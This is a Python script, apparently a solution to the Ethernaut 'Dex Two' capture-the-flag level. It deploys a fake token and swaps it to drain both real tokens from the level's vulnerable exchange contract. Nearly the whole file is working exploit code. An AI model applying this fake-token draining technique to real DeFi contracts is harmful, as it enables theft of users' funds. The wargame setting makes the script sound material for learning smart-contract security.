from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed, MAX_UINT256


ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x0b6F6CE4BCfB70525A31454292017F640C10c768"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user, gas=9000000)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.DexTwo.deploy("JayToken", "Jay", 1000000, instance, sender=user)

    contract = project.Dex.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    # get token addresses
    token1 = contract.token1()
    token2 = contract.token2()

    with accounts.use_sender(user):
        # approve instance from spend our tokens
        contract.approve(instance, MAX_UINT256)

        # approve instance to spend fake tokens
        hacker.approve(instance, MAX_UINT256)

        # add liquidity to instance
        hacker.transfer(instance, 100)

        assert contract.balanceOf(hacker, instance) == 100, "liq !added"

        # swap our fake tokens with all of token1 and token2
        contract.swap(hacker, token1, 100)

        assert contract.balanceOf(token1, instance) == 0, "token1 !0"

        contract.swap(hacker, token2, 200)

        assert contract.balanceOf(token2, instance) == 0, "token2 !0"

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
